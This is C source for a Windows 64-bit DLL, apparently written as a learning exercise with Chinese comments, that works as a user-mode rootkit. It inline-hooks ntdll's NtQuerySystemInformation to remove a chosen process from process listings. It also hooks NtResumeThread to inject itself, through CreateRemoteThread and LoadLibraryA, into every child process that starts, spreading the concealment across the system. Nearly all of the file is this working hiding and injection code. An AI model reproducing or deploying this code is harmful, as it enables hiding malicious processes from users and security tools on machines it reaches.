#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>

#define STR_MODULE_NAME "redqx64.dll"
CHAR* szNtdll = "ntdll.dll";
CHAR* szNtQuerySystemInformatio = "NtQuerySystemInformation";//因为getprocesss的原因,所以没用W版本
CHAR* szNtResumeThread = "NtResumeThread";//因为getprocesss的原因,所以没用W版本

typedef LONG KPRIORITY;
typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemNextEventIdInformation,
	SystemEventIdsInformation,
	SystemCrashDumpInformation,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemPlugPlayBusInformation,
	SystemDockInformation,
	SystemPowerInformation2,
	SystemProcessorSpeedInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation

} SYSTEM_INFORMATION_CLASS;
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;
typedef struct _SYSTEM_THREAD_INFORMATION
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitches;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;
typedef struct _SYSTEM_PROCESS_INFORMATION
{
	ULONG NextEntryOffset;//下一个进程信息的偏移量，允许遍历进程信息链表。
	ULONG NumberOfThreads;//进程中的线程数。
	LARGE_INTEGER SpareLi1;//8
	LARGE_INTEGER SpareLi2;//8
	LARGE_INTEGER SpareLi3;//8
	LARGE_INTEGER CreateTime;//进程创建时间
	LARGE_INTEGER UserTime;//进程执行在用户模式的时间
	LARGE_INTEGER KernelTime;//进程执行在内核模式的时间
	UNICODE_STRING ImageName;//进程的可执行文件路径
	KPRIORITY BasePriority;//进程的基本优先级
	HANDLE UniqueProcessId;//进程的唯一ID。
	HANDLE InheritedFromUniqueProcessId;//继承进程的唯一ID
	ULONG HandleCount;//进程当前打开的句柄数量。
	ULONG SessionId;//进程所属的会话ID
	ULONG_PTR PageDirectoryBase;//进程的唯一键
	SIZE_T PeakVirtualSize;//进程的峰值虚拟内存大小
	SIZE_T VirtualSize;//进程的虚拟内存大小
	ULONG PageFaultCount;//进程的页面错误次数
	SIZE_T PeakWorkingSetSize;//进程的峰值工作集大小
	SIZE_T WorkingSetSize;//进程的工作集大小
	SIZE_T QuotaPeakPagedPoolUsage;//进程的峰值分页池使用量
	SIZE_T QuotaPagedPoolUsage;//进程的分页池使用量
	SIZE_T QuotaPeakNonPagedPoolUsage;//进程的峰值非分页池使用量
	SIZE_T QuotaNonPagedPoolUsage;//进程的非分页池使用量
	SIZE_T PagefileUsage;//进程的页面文件使用量
	SIZE_T PeakPagefileUsage;//进程的峰值页面文件使用量
	SIZE_T PrivatePageCount;//进程的私有页面数量
	LARGE_INTEGER ReadOperationCount;//进程的读取操作计数
	LARGE_INTEGER WriteOperationCount;//进程的写入操作计数
	LARGE_INTEGER OtherOperationCount;//进程的其他操作计数
	LARGE_INTEGER ReadTransferCount;//进程的读取传输计数。
	LARGE_INTEGER WriteTransferCount;//进程的写入传输计数
	LARGE_INTEGER OtherTransferCount;//进程的其他传输计数
	SYSTEM_THREAD_INFORMATION Threads[1];//柔性数组
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef long (WINAPI* type_NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );
typedef BOOL(WINAPI* PFCREATEPROCESSA)(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef BOOL(WINAPI* PFCREATEPROCESSW)(
    LPCTSTR lpApplicationName,
    LPTSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCTSTR lpCurrentDirectory,
    LPSTARTUPINFO lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );
typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID ClientId;
    ULONG AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION;
typedef NTSTATUS(WINAPI* PFZWQUERYINFORMATIONTHREAD)
(
    HANDLE ThreadHandle,
    ULONG ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(WINAPI* PFNtResumeThread)
(
    HANDLE ThreadHandle,
    PULONG SuspendCount
    );
//这块区域
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
WCHAR g_szTargetName[MAX_PATH] = { 0, }; //进程的名字也涉及W版本
#pragma data_seg()

BYTE g_OldAPI_1[16];
BYTE g_OldAPI_2[16];



BOOL unhook_by_code(CHAR* szDllName, CHAR* szFuncName, BYTE* old_mem);
BOOL hook_by_code(CHAR* szDllName, CHAR* szFuncName, BYTE* old_mem, void* funcReplace);

BOOL InjectDll_hook(HANDLE hProcess, CHAR* szDllPath)
{
    HANDLE hRemoteThread;
    LPVOID pRemoteBuf;
    DWORD dwBufSize = strlen(szDllPath) + 1;
    LPTHREAD_START_ROUTINE  pThreadProc;
    DWORD64 exitCode = 0;


    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteBuf)
    {
        WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

        pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);

        //WaitForSingleObject(hRemoteThread, INFINITE);
        WaitForSingleObject(hRemoteThread, 3000);//有些可能报错,一直不返回?
        GetExitCodeThread(hRemoteThread, &exitCode);
        //wDebugLog(L" %p ", exitCode);
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hRemoteThread);
    }
    CloseHandle(hProcess);
    if (exitCode)
        return TRUE;
    else
        return FALSE;
}

NTSTATUS WINAPI my_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS arg_SystemInformationClass,
    PVOID arg_SystemInformation,
    ULONG arg_SystemInformationLength,
    PULONG arg_ReturnLength
)
{
    NTSTATUS status;
    FARPROC pFunc;
    PSYSTEM_PROCESS_INFORMATION lp_LinkCur, lp_Link_Pre = 0;
    //脱钩,因为后面我们要调用真正的NtQuerySystemInformatio.. 否则无法正常调用

    unhook_by_code(szNtdll, szNtQuerySystemInformatio,g_OldAPI_1);

    pFunc = GetProcAddress(GetModuleHandleA(szNtdll), szNtQuerySystemInformatio);
    status = ((type_NtQuerySystemInformation)pFunc)(arg_SystemInformationClass, arg_SystemInformation, arg_SystemInformationLength, arg_ReturnLength);
    //先实际上调用一遍 原始的NtQuerySystemInformation

    if (status != 0)
    {
        goto __NTQUERYSYSTEMINFORMATION_END;//这个分支不太明白
    }
    //DebugLog("%d %d\n", arg_SystemInformationClass, SystemProcessInformation);
    if (arg_SystemInformationClass == SystemProcessInformation)
    {

        lp_LinkCur = (PSYSTEM_PROCESS_INFORMATION)arg_SystemInformation;//为什么要自己去定义呢

        while (TRUE)
        {
            //删除链表中间节点的操作
            //头节点排外,而且我们也无法删除头节点
            if (lp_LinkCur->ImageName.Buffer!= NULL)
            {
                if (!_wcsicmp(lp_LinkCur->ImageName.Buffer, g_szTargetName))//只能是W版本
                {
                    if (lp_LinkCur->NextEntryOffset == 0)
                    {
                        if (lp_Link_Pre)
                        {
                            lp_Link_Pre->NextEntryOffset = 0;
                        }
                    }
                    else
                    {
                        if (lp_Link_Pre)
                        {
                            lp_Link_Pre->NextEntryOffset += lp_LinkCur->NextEntryOffset;

                        }                
                    }
                }
                else
                {
                    lp_Link_Pre = lp_LinkCur;
                    //上一个=当前
                }
            }
            if (lp_LinkCur->NextEntryOffset == 0)
            {
                break;
            }
            lp_LinkCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)lp_LinkCur + lp_LinkCur->NextEntryOffset);
        }
    }

__NTQUERYSYSTEMINFORMATION_END:

    //对NtQuerySystemInformatio挂钩
    hook_by_code(szNtdll, szNtQuerySystemInformatio, g_OldAPI_1,my_NtQuerySystemInformation);



    return status;
}

BYTE* getReallCall(BYTE* lp)
{
    return  *(DWORD*)(lp + 1) + (BYTE*)lp + 5;
}

/*
* 函数名字: my_NtQuerySystemInformation
* 函数参数: 很多
* 函数功能: 删除notepad的那个节点
*/
BOOL hook_by_code(CHAR* szDllName, CHAR* szFuncName, BYTE* old_mem,void* funcReplace)
{
    FARPROC pfnOrg;
    BYTE* dwOldProtect;
    VOID* dwAddress;
    BYTE pBuf[16] = { 
        0x48,0xB8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, //mov rax, xx
        0xFF,0xE0 //jmp rax
    };
    PBYTE pByte;
    
 
    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pfnOrg;

    if (pByte[0] == 0x48)
    {
        return FALSE;
    }

    VirtualProtect((LPVOID)pfnOrg, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(old_mem, pfnOrg, 12);
    dwAddress = getReallCall(funcReplace);
    memcpy(&pBuf[2], &dwAddress , 8);
    memcpy(pfnOrg, pBuf, 12);

    VirtualProtect((LPVOID)pfnOrg, 12, dwOldProtect, &dwOldProtect);

    return TRUE;
}
BOOL unhook_by_code(CHAR*szDllName, CHAR* szFuncName, BYTE* old_mem)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;

    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pFunc;

    if (pByte[0] != 0x48)//没被hook
        return FALSE;

    VirtualProtect((LPVOID)pFunc, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(pFunc, old_mem, 12);
    VirtualProtect((LPVOID)pFunc, 12, dwOldProtect, &dwOldProtect);

    return TRUE;
}
void DebugLog(const char* format, ...)
{
    va_list vl;
    char szLog[512] = { 0, };

    va_start(vl, format);
    vsprintf(szLog, format, vl);
    va_end(vl);

    OutputDebugStringA(szLog);
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        DebugLog("OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        DebugLog("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if (!AdjustTokenPrivileges(hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        DebugLog("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        DebugLog("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}
NTSTATUS WINAPI my_NtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount)
{
    NTSTATUS status=0, statusThread;
    FARPROC pFunc = NULL, pFuncThread = NULL;
    DWORD dwPID = 0;
    static DWORD dwPrevPID = 0;
    THREAD_BASIC_INFORMATION tbi;
    HMODULE hMod = NULL;
    CHAR szModPath[MAX_PATH] = { 0, };
    HANDLE hProcess;
 
    hMod = GetModuleHandleA("ntdll.dll");
    if (hMod == NULL)
    {
        DebugLog("NewNtResumeThread() : GetModuleHandle() failed!!! [%d]\n",GetLastError());
        return NULL;
    }

    // call ntdll!ZwQueryInformationThread()
    pFuncThread = GetProcAddress(hMod, "ZwQueryInformationThread");
    if (pFuncThread == NULL)
    {
        DebugLog("NewNtResumeThread() : GetProcAddress() failed!!! [%d]\n",GetLastError());
        return NULL;
    }

    statusThread = ((PFZWQUERYINFORMATIONTHREAD)pFuncThread)(ThreadHandle, 0, &tbi, sizeof(tbi), NULL);
    if (statusThread != 0)
    {
        DebugLog("NewNtResumeThread() : pFuncThread() failed!!! [%d]\n", GetLastError());
        return NULL;
    }

    dwPID = (DWORD)tbi.ClientId.UniqueProcess;
    if ((dwPID != GetCurrentProcessId()) && (dwPID != dwPrevPID))
    {
        DebugLog("NewNtResumeThread() => call InjectDll()\n");

        dwPrevPID = dwPID;

        // change privilege 如果权限已经够了,就不需要提权了
        //if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
        //DebugLog("NewNtResumeThread() : SetPrivilege() failed!!!\n");

        // get injection dll path
        GetModuleFileNameA(GetModuleHandleA(STR_MODULE_NAME),szModPath,MAX_PATH);
        if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
        {
            DebugLog("OpenProcess failed");
            return FALSE;
        }
        if (!InjectDll_hook(hProcess, szModPath))
        {
            DebugLog("NewNtResumeThread() : InjectDll(%d) failed!!!\n", dwPID);
        }
    }

    // call ntdll!NtResumeThread()
    if (!unhook_by_code("ntdll.dll", "NtResumeThread", g_OldAPI_2))
    {
        DebugLog("NewNtResumeThread() : unhook_by_code() failed!!!\n");
        return NULL;
    }

    pFunc = GetProcAddress(hMod, "NtResumeThread");
    if (pFunc == NULL)
    {
        DebugLog("NewNtResumeThread() : GetProcAddress() failed!!! [%d]\n",
            GetLastError());
        goto __NTRESUMETHREAD_END;
    }

    status = ((PFNtResumeThread)pFunc)(ThreadHandle, SuspendCount);
    if (status != 0)
    {
        DebugLog("NewNtResumeThread() : pFunc() failed!!! [%d]\n", GetLastError());
        goto __NTRESUMETHREAD_END;
    }

__NTRESUMETHREAD_END:

    if (!hook_by_code("ntdll.dll", "NtResumeThread", g_OldAPI_2,(PROC)my_NtResumeThread))
    {
        DebugLog("NewNtResumeThread() : hook_by_code() failed!!!\n");
    }

    DebugLog("NewNtResumeThread() : end!!!\n");

    return status;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {

    case DLL_PROCESS_ATTACH:
        hook_by_code(szNtdll, szNtQuerySystemInformatio, g_OldAPI_1,my_NtQuerySystemInformation);
        hook_by_code(szNtdll, szNtResumeThread, g_OldAPI_2, my_NtResumeThread);

        break;
    case DLL_PROCESS_DETACH:
        unhook_by_code(szNtdll, szNtQuerySystemInformatio, g_OldAPI_1);
        unhook_by_code(szNtdll, szNtResumeThread, g_OldAPI_2);
  
        break;
    }
    return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
    __declspec(dllexport) void Set_TagetProcess(WCHAR* szProcName)
    {
        wcscpy(g_szTargetName, szProcName);
    }
#ifdef __cplusplus
}
#endif

//象征性的插入一个dll
#ifdef __cplusplus
extern "C" {
#endif
    __declspec(dllexport) void funny() //形式上的导出函数
    {
        return;
    }
#ifdef __cplusplus
}
#endif